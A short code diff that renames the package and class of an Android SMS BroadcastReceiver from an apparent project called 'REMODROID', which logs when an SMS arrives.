@@ -1,4 +1,4 @@
-package com.remo.connections;
+package com.remo.features.broadcastReceivers;
 
 import android.content.BroadcastReceiver;
 import android.content.Context;
@@ -7,7 +7,7 @@ import android.provider.Telephony;
 import android.telephony.SmsMessage;
 import android.util.Log;
 
-public class BRSMS extends BroadcastReceiver {
+public class sms extends BroadcastReceiver {
     @Override
     public void onReceive(Context context, Intent intent) {
         Log.d("REMODROID", "SMS Received");
